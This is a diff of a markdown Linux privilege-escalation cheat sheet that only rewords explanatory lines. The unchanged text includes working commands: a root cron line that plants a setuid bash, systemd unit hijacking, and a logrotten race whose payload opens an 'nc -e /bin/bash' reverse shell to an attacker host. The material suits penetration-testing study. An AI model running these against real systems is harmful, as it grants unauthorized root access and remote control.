@@ -6,7 +6,7 @@ Note: privileged caller, controllable source/destination, overwrite vs append, s
 | Destination | Needs |
 | --- | --- |
 | sudoers include | Include dir active, accepted filename, mode `0440`, valid syntax |
-| passwd/shadow | Correct record format; keep existing entries — worked example: [misc-vectors](misc-vectors.md#readable-secrets) |
+| passwd/shadow | Correct record format; keep existing entries. Worked example: [misc-vectors](misc-vectors.md#readable-secrets) |
 | cron | System vs user-crontab format, accepted owner/mode, schedule |
 | systemd unit | `ExecStart=`, restart trigger or wait for the next scheduled/boot run |
 | SSH authorized_keys | Right account/home/key path, accepted metadata, sshd login policy |
@@ -21,7 +21,7 @@ System crontab (`/etc/crontab`, `/etc/cron.d/*`) has a **user** field a personal
 ```bash
 printf '* * * * * root cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\n' > /etc/cron.d/<NAME>
 ```
-- Wrong field count is the single most common reason a dropped cron line silently never runs — count the five time fields, then the user, then the command.
+- Wrong field count is the usual reason a dropped cron line never runs. Count the five time fields, then the user, then the command.
 
 ## systemd unit: write + restart
 ```bash
@@ -35,14 +35,14 @@ systemctl restart <UNIT>
 - `ExecStart=` has no shell: wrap in `/bin/bash -c "..."` for pipes/redirects/chaining.
 
 ## Logrotate race (logrotten)
-Root runs logrotate on a log path you control, with `create`/`compress`/`copy` set — not a direct write, a **race** during rotation:
+Root runs logrotate on a log path you control, with `create`/`compress`/`copy` set. This is a **race** during rotation, not a direct write:
 ```bash
 gcc -o logrotten logrotten.c
 echo 'if [ "$(id -u)" -eq 0 ]; then (nc -e /bin/bash <KALI> <PORT> &); fi' > payloadfile
 ./logrotten -p ./payloadfile /path/to/writable.log              # "create" option set
 ./logrotten -p ./payloadfile -c -s 4 /path/to/writable.log       # "compress" option set
 ```
-- Needs logrotate running as root (cron/timer) over a path you can write, and knowing which option (`create`/`compress`) is active in its config — check `/etc/logrotate.conf` and `/etc/logrotate.d/*` if readable.
+- Needs logrotate running as root (cron/timer) over a path you can write, and knowing which option (`create`/`compress`) is active in its config. Check `/etc/logrotate.conf` and `/etc/logrotate.d/*` if readable.
 - Source: [logrotten](https://codeberg.org/whotwagner/logrotten) (moved from GitHub).
 
 ## Symlink-following writer
